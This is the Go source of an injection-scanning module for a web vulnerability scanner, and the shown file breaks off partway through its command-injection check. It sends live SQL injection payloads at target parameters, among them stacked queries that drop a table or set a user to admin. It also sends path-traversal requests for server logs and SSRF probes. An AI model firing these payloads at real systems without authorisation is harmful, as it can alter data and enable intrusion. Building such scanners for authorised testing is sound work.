package inject

import (
	"context"
	"fmt"
	"net/url"
	"strings"
	"time"

	"github.com/aydocs/fang/internal/engine"
	fanghttp "github.com/aydocs/fang/internal/http"
	"github.com/aydocs/fang/internal/inject"
	"github.com/aydocs/fang/pkg/models"
)

type AdvancedInjectModule struct {
	cfg    *engine.Config
	client *fanghttp.Client
}

func (m *AdvancedInjectModule) ID() string   { return "inject" }
func (m *AdvancedInjectModule) Name() string { return "Advanced Injection Scanner" }
func (m *AdvancedInjectModule) Description() string {
	return "Comprehensive injection vulnerability scanner covering SQLi, XSS, LFI, SSRF, XXE, CMDi, CRLF, SSTI, NoSQLi, LDAP, and XPath injection"
}
func (m *AdvancedInjectModule) Severity() models.Severity { return models.Critical }

func (m *AdvancedInjectModule) Init(ctx context.Context, cfg *engine.Config) error {
	m.cfg = cfg
	m.client = fanghttp.NewClient(fanghttp.WithTimeout(cfg.Timeout))
	return nil
}

func (m *AdvancedInjectModule) Scan(ctx context.Context, target *models.Target) ([]*models.Finding, error) {
	var findings []*models.Finding

	fs := m.scanSQLi(ctx, target)
	findings = append(findings, fs...)

	fs = m.scanXSS(ctx, target)
	findings = append(findings, fs...)

	fs = m.scanLFI(ctx, target)
	findings = append(findings, fs...)

	fs = m.scanSSRF(ctx, target)
	findings = append(findings, fs...)

	fs = m.scanXXE(ctx, target)
	findings = append(findings, fs...)

	fs = m.scanCMDi(ctx, target)
	findings = append(findings, fs...)

	fs = m.scanCRLF(ctx, target)
	findings = append(findings, fs...)

	fs = m.scanSSTI(ctx, target)
	findings = append(findings, fs...)

	fs = m.scanNoSQLi(ctx, target)
	findings = append(findings, fs...)

	fs = m.scanLDAP(ctx, target)
	findings = append(findings, fs...)

	fs = m.scanXPath(ctx, target)
	findings = append(findings, fs...)

	return findings, nil
}

func (m *AdvancedInjectModule) buildURL(parsed *url.URL, params url.Values, paramName, value string) string {
	newParams := make(url.Values)
	for k, v := range params {
		newParams[k] = v
	}
	newParams.Set(paramName, value)
	return fmt.Sprintf("%s://%s%s?%s", parsed.Scheme, parsed.Host, parsed.Path, newParams.Encode())
}

func (m *AdvancedInjectModule) makeFinding(title string, severity models.Severity, confidence models.Confidence, urlStr, param, payload, evidence, description, remediation, cwe string) *models.Finding {
	return &models.Finding{
		Title:       title,
		Severity:    severity,
		Confidence:  confidence,
		URL:         urlStr,
		Parameter:   param,
		Payload:     payload,
		Evidence:    evidence,
		Description: fmt.Sprintf(description, param),
		Remediation: remediation,
		CWEID:       cwe,
		ModuleID:    "inject",
	}
}

func absInt(x int) int {
	if x < 0 {
		return -x
	}
	return x
}

var timeSQLiPayloads = []struct {
	payload string
	delay   float64
}{
	{"' OR SLEEP(5)--", 4.5},
	{"' AND SLEEP(5)--", 4.5},
	{"' OR SLEEP(3)--", 2.5},
	{"'; WAITFOR DELAY '0:0:5'--", 4.5},
	{"1' AND SLEEP(5)--", 4.5},
	{"1; SELECT SLEEP(5)--", 4.5},
	{"' OR pg_sleep(5)--", 4.5},
	{"' OR 1=1; WAITFOR DELAY '0:0:5'--", 4.5},
	{"1' AND 1=(SELECT COUNT(*) FROM information_schema.tables A, information_schema.tables B, information_schema.tables C)--", 0.5},
}

func (m *AdvancedInjectModule) scanSQLi(ctx context.Context, target *models.Target) []*models.Finding {
	var findings []*models.Finding

	parsed, err := url.Parse(target.URL)
	if err != nil {
		return nil
	}

	params, _ := url.ParseQuery(parsed.RawQuery)
	paramNames := make([]string, 0, len(params))
	for k := range params {
		paramNames = append(paramNames, k)
	}
	if len(paramNames) == 0 {
		paramNames = []string{"id", "user", "search", "q", "page", "cat", "item", "product", "article", "news", "sort", "order", "filter", "type", "name", "email", "pass", "password", "username", "login"}
	}

paramLoop:
	for _, paramName := range paramNames {
		var baselineVal string
		if vals, ok := params[paramName]; ok && len(vals) > 0 {
			baselineVal = vals[0]
		} else {
			baselineVal = "1"
		}

		baselineURL := m.buildURL(parsed, params, paramName, baselineVal)
		baselineResp, err := m.client.Get(baselineURL)
		if err != nil {
			continue
		}

		select {
		case <-ctx.Done():
			return findings
		default:
		}

		for _, p := range inject.SQLIErrorPayloads() {
			select {
			case <-ctx.Done():
				return findings
			default:
			}
			testURL := m.buildURL(parsed, params, paramName, p)
			resp, err := m.client.Get(testURL)
			if err != nil {
				continue
			}

			respBody := strings.ToLower(resp.Body)
			for _, errMsg := range inject.SQLIErrorPatterns() {
				if strings.Contains(respBody, strings.ToLower(errMsg)) {
					findings = append(findings, m.makeFinding(
						fmt.Sprintf("SQL Injection - Error Based (%s)", p),
						models.Critical, models.HighConfidence,
						testURL, paramName, p,
						fmt.Sprintf("SQL error detected: %s", errMsg),
						"Parameter '%s' is vulnerable to error-based SQL injection. The application reflects database error messages.",
						"Use parameterized queries/prepared statements with bound parameters. Implement proper error handling.",
						"CWE-89",
					))
					continue paramLoop
				}
			}
		}

		select {
		case <-ctx.Done():
			return findings
		default:
		}

		for _, p := range inject.NoSQLPayloads() {
			select {
			case <-ctx.Done():
				return findings
			default:
			}
			testURL := m.buildURL(parsed, params, paramName, p)
			resp, err := m.client.Get(testURL)
			if err != nil {
				continue
			}

			respBody := strings.ToLower(resp.Body)
			for _, errMsg := range inject.NoSQLErrorPatterns() {
				if strings.Contains(respBody, strings.ToLower(errMsg)) {
					findings = append(findings, m.makeFinding(
						"NoSQL Injection",
						models.Critical, models.HighConfidence,
						testURL, paramName, p,
						fmt.Sprintf("NoSQL error detected: %s", errMsg),
						"Parameter '%s' is vulnerable to NoSQL injection.",
						"Sanitize NoSQL query inputs. Use parameterized queries for MongoDB.",
						"CWE-943",
					))
					continue paramLoop
				}
			}
		}

		select {
		case <-ctx.Done():
			return findings
		default:
		}

		truePayload := "1' AND '1'='1"
		falsePayload := "1' AND '1'='2"
		trueURL := m.buildURL(parsed, params, paramName, truePayload)
		falseURL := m.buildURL(parsed, params, paramName, falsePayload)

		trueResp, err := m.client.Get(trueURL)
		if err == nil {
			falseResp, err := m.client.Get(falseURL)
			if err == nil {
				bodyDiff := absInt(len(trueResp.Body) - len(falseResp.Body))
				if bodyDiff > len(baselineResp.Body)/10 && bodyDiff > 50 {
					findings = append(findings, m.makeFinding(
						"SQL Injection - Blind Boolean Based",
						models.High, models.MediumConfidence,
						trueURL, paramName, truePayload,
						fmt.Sprintf("Response size differs by %d bytes between true/false conditions", bodyDiff),
						"Parameter '%s' shows different responses for true/false conditions, suggesting blind SQL injection.",
						"Use parameterized queries/prepared statements.",
						"CWE-89",
					))
				}
			}
		}

		select {
		case <-ctx.Done():
			return findings
		default:
		}

		for _, tp := range timeSQLiPayloads {
			select {
			case <-ctx.Done():
				return findings
			default:
			}
			testURL := m.buildURL(parsed, params, paramName, tp.payload)

			start := time.Now()
			tresp, terr := m.client.Get(testURL)
			elapsed := time.Since(start).Seconds()
			if terr != nil {
				continue
			}
			_ = tresp

			if elapsed >= tp.delay {
				baselineStart := time.Now()
				m.client.Get(baselineURL)
				baselineElapsed := time.Since(baselineStart).Seconds()

				if elapsed > baselineElapsed+2 {
					findings = append(findings, m.makeFinding(
						"SQL Injection - Time Based",
						models.Critical, models.HighConfidence,
						testURL, paramName, tp.payload,
						fmt.Sprintf("Response delay: %.2fs (baseline: %.2fs)", elapsed, baselineElapsed),
						"Parameter '%s' causes time delays matching SQL sleep functions.",
						"Use parameterized queries/prepared statements.",
						"CWE-89",
					))
					continue paramLoop
				}
			}
		}

		select {
		case <-ctx.Done():
			return findings
		default:
		}

		for _, count := range []int{1, 2, 3, 4, 5} {
			select {
			case <-ctx.Done():
				return findings
			default:
			}
			nulls := strings.Repeat("NULL,", count)
			nulls = strings.TrimSuffix(nulls, ",")
			unionPayload := fmt.Sprintf("' UNION SELECT %s--", nulls)
			testURL := m.buildURL(parsed, params, paramName, unionPayload)

			uresp, uerr := m.client.Get(testURL)
			if uerr != nil {
				continue
			}

			if uresp.StatusCode == 200 && len(uresp.Body) > 0 {
				sizeDiff := absInt(len(uresp.Body) - len(baselineResp.Body))
				if sizeDiff > 50 && uresp.StatusCode == baselineResp.StatusCode {
					findings = append(findings, m.makeFinding(
						fmt.Sprintf("SQL Injection - Union Based (%d columns)", count),
						models.High, models.MediumConfidence,
						testURL, paramName, unionPayload,
						fmt.Sprintf("Response changed: baseline %d bytes, union %d bytes", len(baselineResp.Body), len(uresp.Body)),
						"Parameter '%s' responds to UNION SELECT with different content.",
						"Use parameterized queries/prepared statements.",
						"CWE-89",
					))
				}
			}
		}

		select {
		case <-ctx.Done():
			return findings
		default:
		}

		stackedQueries := []string{
			"'; DROP TABLE IF EXISTS test--",
			"'; INSERT INTO logs VALUES('test')--",
			"'; UPDATE users SET admin=1 WHERE id=1--",
			"'; SELECT * FROM users--",
		}
		for _, sq := range stackedQueries {
			select {
			case <-ctx.Done():
				return findings
			default:
			}
			testURL := m.buildURL(parsed, params, paramName, sq)
			sresp, serr := m.client.Get(testURL)
			if serr != nil {
				continue
			}
			if sresp.StatusCode == 200 && !strings.Contains(strings.ToLower(sresp.Body), "error") && strings.Contains(strings.ToLower(sresp.Body), strings.ToLower(baselineResp.Body[:minInt(100, len(baselineResp.Body))])) {
				findings = append(findings, m.makeFinding(
					"SQL Injection - Stacked Queries",
					models.Critical, models.MediumConfidence,
					testURL, paramName, sq,
					"Stacked query execution appears possible",
					"Parameter '%s' may support stacked SQL queries.",
					"Use parameterized queries. Disable multiple statement execution in database drivers.",
					"CWE-89",
				))
				break
			}
		}
	}

	return findings
}

func minInt(a, b int) int {
	if a < b {
		return a
	}
	return b
}

func (m *AdvancedInjectModule) scanXSS(ctx context.Context, target *models.Target) []*models.Finding {
	var findings []*models.Finding

	parsed, err := url.Parse(target.URL)
	if err != nil {
		return nil
	}

	params, _ := url.ParseQuery(parsed.RawQuery)
	paramNames := make([]string, 0, len(params))
	for k := range params {
		paramNames = append(paramNames, k)
	}
	if len(paramNames) == 0 {
		paramNames = []string{"q", "search", "query", "input", "text", "name", "comment", "message", "page", "s", "user", "email", "subject", "content", "body"}
	}

	for _, paramName := range paramNames {
		var baselineVal string
		if vals, ok := params[paramName]; ok && len(vals) > 0 {
			baselineVal = vals[0]
		} else {
			baselineVal = "test"
		}

		baselineURL := m.buildURL(parsed, params, paramName, baselineVal)
		baselineResp, err := m.client.Get(baselineURL)
		if err != nil {
			continue
		}

		select {
		case <-ctx.Done():
			return findings
		default:
		}

		marker := inject.UniqueMarker("XSS")
		markerURL := m.buildURL(parsed, params, paramName, marker)
		markerResp, err := m.client.Get(markerURL)
		if err != nil {
			continue
		}

		isReflected := !strings.Contains(baselineResp.Body, marker) && strings.Contains(markerResp.Body, marker)
		if isReflected {
			findings = append(findings, &models.Finding{
				Title:       "XSS - Potential Reflection Point",
				Severity:    models.Medium,
				Confidence:  models.MediumConfidence,
				URL:         markerURL,
				Parameter:   paramName,
				Payload:     marker,
				Evidence:    "Unique marker reflected in response body",
				Description: fmt.Sprintf("Parameter '%s' reflects user input in the response. This may be exploitable for XSS.", paramName),
				Remediation: "Implement input validation, output encoding, and Content-Security-Policy headers.",
				CWEID:       "CWE-79",
				ModuleID:    "inject",
			})
		}

		for _, xp := range inject.XSSPayloads() {
			select {
			case <-ctx.Done():
				return findings
			default:
			}

			testURL := m.buildURL(parsed, params, paramName, xp.Value)
			resp, err := m.client.Get(testURL)
			if err != nil {
				continue
			}

			if strings.Contains(resp.Body, xp.Check) {
				if m.isEncoded(resp.Body, xp.Check) {
					continue
				}

				findings = append(findings, &models.Finding{
					Title:       fmt.Sprintf("XSS - %s", xp.Name),
					Severity:    models.High,
					Confidence:  models.HighConfidence,
					URL:         testURL,
					Parameter:   paramName,
					Payload:     xp.Value,
					Evidence:    fmt.Sprintf("Payload reflected unencoded: %s", xp.Check),
					Description: fmt.Sprintf("Parameter '%s' is vulnerable to reflected XSS with %s payload.", paramName, xp.Name),
					Remediation: "Implement context-aware output encoding. Use CSP headers. Validate and sanitize all user input.",
					CWEID:       "CWE-79",
					ModuleID:    "inject",
				})
				break
			}
		}

		for _, cp := range inject.XSSContextualPayloads() {
			select {
			case <-ctx.Done():
				return findings
			default:
			}

			testURL := m.buildURL(parsed, params, paramName, cp.Value)
			resp, err := m.client.Get(testURL)
			if err != nil {
				continue
			}

			if strings.Contains(resp.Body, cp.Check) {
				findings = append(findings, &models.Finding{
					Title:       fmt.Sprintf("XSS - Contextual (%s context)", cp.Context),
					Severity:    models.High,
					Confidence:  models.MediumConfidence,
					URL:         testURL,
					Parameter:   paramName,
					Payload:     cp.Value,
					Evidence:    fmt.Sprintf("%s context XSS payload reflected", cp.Context),
					Description: fmt.Sprintf("Parameter '%s' reflects input in %s context, allowing context-specific XSS.", paramName, cp.Context),
					Remediation: "Use context-appropriate output encoding. Never trust user input in script/attribute contexts.",
					CWEID:       "CWE-79",
					ModuleID:    "inject",
				})
			}
		}

		for _, bp := range inject.XSSBlindPayloads() {
			select {
			case <-ctx.Done():
				return findings
			default:
			}

			testURL := m.buildURL(parsed, params, paramName, bp.Value)
			resp, err := m.client.Get(testURL)
			if err != nil {
				continue
			}

			if strings.Contains(resp.Body, bp.Check) {
				findings = append(findings, &models.Finding{
					Title:       "XSS - Blind / Stored",
					Severity:    models.High,
					Confidence:  models.MediumConfidence,
					URL:         testURL,
					Parameter:   paramName,
					Payload:     bp.Value,
					Evidence:    "Blind XSS callback marker found in response",
					Description: fmt.Sprintf("Parameter '%s' may be vulnerable to stored/blind XSS. The payload persists in the application.", paramName),
					Remediation: "Implement input validation and output encoding. Use CSP with report-uri for monitoring.",
					CWEID:       "CWE-79",
					ModuleID:    "inject",
				})
			}
		}
	}

	return findings
}

func (m *AdvancedInjectModule) isEncoded(body, check string) bool {
	encodings := []string{
		"&lt;", "&gt;", "&amp;", "&quot;",
		"&#60;", "&#62;", "&#34;",
		`\u003c`, `\u003e`,
		url.QueryEscape(check),
	}
	for _, enc := range encodings {
		if strings.Contains(body, enc) {
			return true
		}
	}
	return false
}

func (m *AdvancedInjectModule) scanLFI(ctx context.Context, target *models.Target) []*models.Finding {
	var findings []*models.Finding

	parsed, err := url.Parse(target.URL)
	if err != nil {
		return nil
	}

	params, _ := url.ParseQuery(parsed.RawQuery)
	paramNames := make([]string, 0, len(params))
	for k := range params {
		paramNames = append(paramNames, k)
	}
	if len(paramNames) == 0 {
		paramNames = []string{"file", "page", "include", "path", "doc", "folder", "root", "pg", "style", "pdf", "template", "php_path", "document", "category", "load", "conf", "config", "lang", "language"}
	}

paramLoop:
	for _, paramName := range paramNames {
		select {
		case <-ctx.Done():
			return findings
		default:
		}

		var baselineVal string
		if vals, ok := params[paramName]; ok && len(vals) > 0 {
			baselineVal = vals[0]
		} else {
			baselineVal = "test"
		}

		baselineURL := m.buildURL(parsed, params, paramName, baselineVal)
		baselineResp, err := m.client.Get(baselineURL)
		if err != nil {
			continue
		}

		for _, pt := range inject.LFIPathTraversal() {
			select {
			case <-ctx.Done():
				return findings
			default:
			}

			testURL := m.buildURL(parsed, params, paramName, pt.Value)
			resp, err := m.client.Get(testURL)
			if err != nil {
				continue
			}

			if pt.Check != "" && strings.Contains(resp.Body, pt.Check) {
				if !strings.Contains(baselineResp.Body, pt.Check) {
					findings = append(findings, &models.Finding{
						Title:       fmt.Sprintf("LFI - Path Traversal (%s)", pt.Name),
						Severity:    models.Critical,
						Confidence:  models.HighConfidence,
						URL:         testURL,
						Parameter:   paramName,
						Payload:     pt.Value,
						Evidence:    fmt.Sprintf("File content '%s' found in response", pt.Check),
						Description: fmt.Sprintf("Parameter '%s' is vulnerable to path traversal/local file inclusion.", paramName),
						Remediation: "Validate and sanitize file paths. Use a whitelist of allowed files. Avoid passing user input to file functions.",
						CWEID:       "CWE-22",
						ModuleID:    "inject",
					})
					continue paramLoop
				}
			}
		}

		for _, pw := range inject.LFIPHPWrappers() {
			select {
			case <-ctx.Done():
				return findings
			default:
			}

			testURL := m.buildURL(parsed, params, paramName, pw.Value)
			r, e := m.client.Get(testURL)
			if e != nil {
				continue
			}

			if pw.Check != "" && strings.Contains(r.Body, pw.Check) {
				if !strings.Contains(baselineResp.Body, pw.Check) {
					findings = append(findings, &models.Finding{
						Title:       fmt.Sprintf("LFI - PHP Wrapper (%s)", pw.Name),
						Severity:    models.Critical,
						Confidence:  models.HighConfidence,
						URL:         testURL,
						Parameter:   paramName,
						Payload:     pw.Value,
						Evidence:    fmt.Sprintf("Base64-encoded content detected: '%s'", pw.Check),
						Description: fmt.Sprintf("Parameter '%s' supports PHP stream wrappers for file reads.", paramName),
						Remediation: "Disable PHP wrappers (allow_url_fopen, allow_url_include). Validate file paths.",
						CWEID:       "CWE-22",
						ModuleID:    "inject",
					})
					continue paramLoop
				}
			}
		}

		for _, ep := range inject.LFIErrorPatterns() {
			select {
			case <-ctx.Done():
				return findings
			default:
			}

			testURL := m.buildURL(parsed, params, paramName, "../../../nonexistent_file")
			eResp, eErr := m.client.Get(testURL)
			if eErr != nil {
				continue
			}

			respBody := strings.ToLower(eResp.Body)
			if strings.Contains(respBody, strings.ToLower(ep)) && !strings.Contains(strings.ToLower(baselineResp.Body), strings.ToLower(ep)) {
				findings = append(findings, &models.Finding{
					Title:       "LFI - Error Based Detection",
					Severity:    models.High,
					Confidence:  models.MediumConfidence,
					URL:         testURL,
					Parameter:   paramName,
					Payload:     "../../../nonexistent_file",
					Evidence:    fmt.Sprintf("File inclusion error: %s", ep),
					Description: fmt.Sprintf("Parameter '%s' shows file inclusion errors suggesting LFI vulnerability.", paramName),
					Remediation: "Disable detailed PHP error messages. Validate file paths against a whitelist.",
					CWEID:       "CWE-22",
					ModuleID:    "inject",
				})
				break
			}
		}

		logPaths := []string{
			"../../../var/log/apache2/access.log",
			"../../../var/log/apache/access.log",
			"../../../var/log/nginx/access.log",
			"../../../var/log/httpd/access_log",
			"../../../var/log/httpd/error_log",
			"../../../var/log/apache2/error.log",
			"../../../var/log/apache/error.log",
			"../../../var/log/nginx/error.log",
			"../../../../Windows/debug/NetSetup.log",
		}
		for _, logPath := range logPaths {
			select {
			case <-ctx.Done():
				return findings
			default:
			}

			testURL := m.buildURL(parsed, params, paramName, logPath)
			lresp, lerr := m.client.Get(testURL)
			if lerr != nil {
				continue
			}

			if strings.Contains(lresp.Body, "GET /") || strings.Contains(lresp.Body, "HTTP/1.1") || strings.Contains(lresp.Body, "apache") || strings.Contains(lresp.Body, "nginx") || strings.Contains(lresp.Body, "Microsoft") {
				findings = append(findings, &models.Finding{
					Title:       "LFI - Log Poisoning Possible",
					Severity:    models.Critical,
					Confidence:  models.MediumConfidence,
					URL:         testURL,
					Parameter:   paramName,
					Payload:     logPath,
					Evidence:    "Log file contents found in response",
					Description: fmt.Sprintf("Parameter '%s' can read log files, enabling log poisoning attacks.", paramName),
					Remediation: "Restrict file access permissions. Disable PHP allow_url_include. Use chroot or jail.",
					CWEID:       "CWE-22",
					ModuleID:    "inject",
				})
				break
			}
		}
	}

	return findings
}

func (m *AdvancedInjectModule) scanSSRF(ctx context.Context, target *models.Target) []*models.Finding {
	var findings []*models.Finding

	parsed, err := url.Parse(target.URL)
	if err != nil {
		return nil
	}

	params, _ := url.ParseQuery(parsed.RawQuery)
	paramNames := make([]string, 0, len(params))
	for k := range params {
		paramNames = append(paramNames, k)
	}
	if len(paramNames) == 0 {
		paramNames = []string{"url", "uri", "link", "src", "dest", "redirect", "redirect_uri", "return", "next", "path", "file", "document", "folder", "image", "img", "load", "fetch", "domain", "host", "endpoint"}
	}

	for _, paramName := range paramNames {
		select {
		case <-ctx.Done():
			return findings
		default:
		}

		var baselineVal string
		if vals, ok := params[paramName]; ok && len(vals) > 0 {
			baselineVal = vals[0]
		} else {
			baselineVal = "test"
		}

		baselineURL := m.buildURL(parsed, params, paramName, baselineVal)
		baselineResp, err := m.client.Get(baselineURL)
		if err != nil {
			continue
		}

		for _, ip := range inject.SSRFInternalIPs() {
			select {
			case <-ctx.Done():
				return findings
			default:
			}
			testURL := m.buildURL(parsed, params, paramName, ip)
			resp, err := m.client.Get(testURL)
			if err != nil {
				continue
			}

			if resp.StatusCode != baselineResp.StatusCode || absInt(len(resp.Body)-len(baselineResp.Body)) > 100 {
				hasInternal := strings.Contains(resp.Body, "root:") ||
					strings.Contains(resp.Body, "ROOT") ||
					strings.Contains(strings.ToLower(resp.Body), "html") ||
					resp.StatusCode == 200
				if hasInternal {
					findings = append(findings, &models.Finding{
						Title:       fmt.Sprintf("SSRF - Internal IP Access (%s)", ip),
						Severity:    models.Critical,
						Confidence:  models.HighConfidence,
						URL:         testURL,
						Parameter:   paramName,
						Payload:     ip,
						Evidence:    fmt.Sprintf("Response differs from baseline: status %d vs %d, body size %d vs %d", resp.StatusCode, baselineResp.StatusCode, len(resp.Body), len(baselineResp.Body)),
						Description: fmt.Sprintf("Parameter '%s' is vulnerable to SSRF. Internal IP '%s' was accessible.", paramName, ip),
						Remediation: "Validate and whitelist allowed URLs/domains. Block access to private IP ranges.",
						CWEID:       "CWE-918",
						ModuleID:    "inject",
					})
					goto nextParamSSRF
				}
			}
		}

		for _, cm := range inject.SSRFCloudMetadataEndpoints() {
			select {
			case <-ctx.Done():
				return findings
			default:
			}
			testURL := m.buildURL(parsed, params, paramName, cm.URL)
			resp, err := m.client.Get(testURL)
			if err != nil {
				continue
			}

			if strings.Contains(strings.ToLower(resp.Body), cm.Check) {
				findings = append(findings, &models.Finding{
					Title:       "SSRF - Cloud Metadata Endpoint",
					Severity:    models.Critical,
					Confidence:  models.CriticalConfidence,
					URL:         testURL,
					Parameter:   paramName,
					Payload:     cm.URL,
					Evidence:    fmt.Sprintf("Cloud metadata content detected: '%s' found in response", cm.Check),
					Description: fmt.Sprintf("Parameter '%s' can access cloud metadata services. This can expose cloud credentials.", paramName),
					Remediation: "Block access to cloud metadata IPs (169.254.169.254, etc.). Implement URL whitelisting.",
					CWEID:       "CWE-918",
					ModuleID:    "inject",
				})
				goto nextParamSSRF
			}
		}

		for _, proto := range inject.SSRFProtocols() {
			select {
			case <-ctx.Done():
				return findings
			default:
			}
			testURL := m.buildURL(parsed, params, paramName, proto)
			resp, err := m.client.Get(testURL)
			if err != nil {
				continue
			}

			if strings.Contains(resp.Body, "root:") || strings.Contains(resp.Body, "[fonts]") || strings.Contains(resp.Body, "PATH=") {
				findings = append(findings, &models.Finding{
					Title:       "SSRF - File Protocol Access",
					Severity:    models.Critical,
					Confidence:  models.HighConfidence,
					URL:         testURL,
					Parameter:   paramName,
					Payload:     proto,
					Evidence:    "Local file contents detected in response",
					Description: fmt.Sprintf("Parameter '%s' supports file:// protocol, allowing local file reads.", paramName),
					Remediation: "Disable file:// protocol support. Validate URL schemes against a whitelist.",
					CWEID:       "CWE-918",
					ModuleID:    "inject",
				})
				goto nextParamSSRF
			}
		}

		if m.cfg.Timeout > 3*time.Second {
			testURL := m.buildURL(parsed, params, paramName, "http://10.255.255.1:8080/")
			start := time.Now()
			m.client.Get(testURL)
			elapsed := time.Since(start)

			if elapsed > 2*time.Second {
				findings = append(findings, &models.Finding{
					Title:       "SSRF - Blind (Time-Based)",
					Severity:    models.Medium,
					Confidence:  models.Tentative,
					URL:         testURL,
					Parameter:   paramName,
					Payload:     "http://10.255.255.1:8080/",
					Evidence:    fmt.Sprintf("Request to unreachable internal IP timed out (%.2fs)", elapsed.Seconds()),
					Description: fmt.Sprintf("Parameter '%s' appears to make server-side requests based on timing differences.", paramName),
					Remediation: "Validate all URL inputs. Use a whitelist of allowed protocols and hosts.",
					CWEID:       "CWE-918",
					ModuleID:    "inject",
				})
			}
		}

	nextParamSSRF:
	}

	return findings
}

func (m *AdvancedInjectModule) scanXXE(ctx context.Context, target *models.Target) []*models.Finding {
	var findings []*models.Finding

	for _, cp := range inject.XXEClassicPayloads() {
		select {
		case <-ctx.Done():
			return findings
		default:
		}

		resp, err := m.client.DoRaw("POST", target.URL, map[string]string{"Content-Type": "application/xml"}, cp.Payload)
		if err != nil {
			continue
		}

		if cp.Check != "" && strings.Contains(resp.Body, cp.Check) {
			findings = append(findings, &models.Finding{
				Title:       fmt.Sprintf("XXE - %s", cp.Name),
				Severity:    models.Critical,
				Confidence:  models.HighConfidence,
				URL:         target.URL,
				Payload:     truncatePayload(cp.Payload, 80),
				Evidence:    fmt.Sprintf("File content '%s' found in response", cp.Check),
				Description: "The XML parser processes external entities, allowing local file reads.",
				Remediation: "Disable external entity processing (DOCTYPE and ENTITY) in XML parsers.",
				CWEID:       "CWE-611",
				ModuleID:    "inject",
			})
			goto blindCheckXXE
		}

		if resp.StatusCode != 400 && resp.StatusCode != 500 {
			respBody := strings.ToLower(resp.Body)
			if strings.Contains(respBody, "xml") || strings.Contains(respBody, "entity") || strings.Contains(respBody, "doctype") {
				findings = append(findings, &models.Finding{
					Title:       "XXE - Possible (Blind SSRF)",
					Severity:    models.High,
					Confidence:  models.MediumConfidence,
					URL:         target.URL,
					Payload:     truncatePayload(cp.Payload, 80),
					Evidence:    "XML processing accepted with external entity reference",
					Description: "The application may be processing external entity references. Verify with OOB techniques.",
					Remediation: "Disable external entity processing in XML parsers.",
					CWEID:       "CWE-611",
					ModuleID:    "inject",
				})
				goto blindCheckXXE
			}
		}
	}

blindCheckXXE:
	for _, sp := range inject.XXESOAPPayloads() {
		select {
		case <-ctx.Done():
			return findings
		default:
		}

		soapEndpoints := []string{"/soap", "/ws", "/wsdl", "/api/soap", "/service", "/soap.php", "/soap.aspx", "/api/ws", "/soapws", "/soap-api"}
		for _, endpoint := range soapEndpoints {
			testURL := target.URL + endpoint

			resp, err := m.client.DoRaw("POST", testURL, map[string]string{"Content-Type": "text/xml"}, sp.Payload)
			if err != nil {
				continue
			}

			if sp.Check != "" && strings.Contains(resp.Body, sp.Check) {
				findings = append(findings, &models.Finding{
					Title:       "XXE - SOAP Endpoint",
					Severity:    models.Critical,
					Confidence:  models.HighConfidence,
					URL:         testURL,
					Payload:     truncatePayload(sp.Payload, 80),
					Evidence:    "SOAP endpoint processes external entities",
					Description: fmt.Sprintf("SOAP endpoint at %s is vulnerable to XXE injection.", endpoint),
					Remediation: "Disable external entity processing in SOAP XML parsers.",
					CWEID:       "CWE-611",
					ModuleID:    "inject",
				})
				goto jsonCheckXXE
			}
		}
	}

jsonCheckXXE:
	for _, jp := range inject.XXEJSONPayloads() {
		select {
		case <-ctx.Done():
			return findings
		default:
		}

		resp, err := m.client.DoRaw("POST", target.URL, map[string]string{"Content-Type": "application/json"}, jp.Payload)
		if err != nil {
			continue
		}

		if jp.Check != "" && strings.Contains(resp.Body, jp.Check) {
			findings = append(findings, &models.Finding{
				Title:       "XXE - JSON-to-XML Converter",
				Severity:    models.Critical,
				Confidence:  models.HighConfidence,
				URL:         target.URL,
				Payload:     truncatePayload(jp.Payload, 100),
				Evidence:    "JSON input that was converted to XML processes external entities",
				Description: "The JSON-to-XML converter is vulnerable to XXE injection via embedded XML.",
				Remediation: "Disable external entity processing in the XML conversion layer.",
				CWEID:       "CWE-611",
				ModuleID:    "inject",
			})
			break
		}
	}

	return findings
}

func truncatePayload(s string, max int) string {
	if len(s) > max {
		return s[:max] + "..."
	}
	return s
}

func (m *AdvancedInjectModule) scanCMDi(ctx context.Context, target *models.Target) []*models.Finding {
	var findings []*models.Finding

	parsed, err := url.Parse(target.URL)
	if err != nil {
		return nil
	}

	params, _ := url.ParseQuery(parsed.RawQuery)
	paramNames := make([]string, 0, len(params))
	for k := range params {
		paramNames = append(paramNames, k)
	}
	if len(paramNames) == 0 {
		paramNames = []string{"cmd", "command", "exec", "execute", "ping", "host", "ip", "url", "file", "path", "query", "search", "input", "data", "param", "option", "domain", "server", "target"}
	}

	for _, paramName := range paramNames {
		select {
		case <-ctx.Done():
			return findings
		default:
		}

		var baselineVal string
		if vals, ok := params[paramName]; ok && len(vals) > 0 {
			baselineVal = vals[0]
		} else {
			baselineVal = "test"
		}

		baselineURL := m.buildURL(parsed, params, paramName, baselineVal)
		baselineStart := time.Now()
		baselineResp, err := m.client.Get(baselineURL)
		baselineTime := time.Since(baselineStart).Seconds()
		if err != nil {
			continue
		}

		for _, up := range inject.CMDIUnixPayloads() {
			select {
			case <-ctx.Done():
				return findings
			default:
			}

			testURL := m.buildURL(parsed, params, paramName, up.Value)
			resp, err := m.client.Get(testURL)
			if err != nil {
				continue
			}

			if resp.StatusCode == 200 && strings.Contains(resp.Body, up.Check) {
				if !strings.Contains(baselineResp.Body, up.Check) {
					findings = append(findings, &models.Finding{
						Title:       "OS Command Injection - Output Based (Unix)",
						Severity:    models.Critical,
						Confidence:  models.HighConfidence,
						URL:         testURL,
						Parameter:   paramName,
						Payload:     up.Value,
						Evidence:    fmt.Sprintf("Command output marker '%s' found in response", up.Check),
						Description: fmt.Sprintf("Parameter '%s' is vulnerable to OS command injection.", paramName),
						Remediation: "Never pass user input directly to system commands. Use parameterized APIs.",
						CWEID:       "CWE-78",
						ModuleID:    "inject",
					})
					goto nextParamCMDi
				}
			}
		}

		for _, wp := range inject.CMDIWindowsPayloads() {
			select {
			case <-ctx.Done():
				return findings
			default:
			}

			testURL := m.buildURL(parsed, params, paramName, wp.Value)
			resp, err := m.client.Get(testURL)
			if err != nil {
				continue
			}

			if resp.StatusCode == 200 && strings.Contains(resp.Body, wp.Check) {
				if !strings.Contains(baselineResp.Body, wp.Check) {
					findings = append(findings, &models.Finding{
						Title:       "OS Command Injection - Output Based (Windows)",
						Severity:    models.Critical,
						Confidence:  models.HighConfidence,
						URL:         testURL,
						Parameter:   paramName,
						Payload:     wp.Value,
						Evidence:    "Windows command output marker found in response",
						Description: fmt.Sprintf("Parameter '%s' is vulnerable to OS command injection (Windows).", paramName),
						Remediation: "Never pass user input directly to system commands. Use parameterized APIs.",
						CWEID:       "CWE-78",
						ModuleID:    "inject",
					})
					goto nextParamCMDi
				}
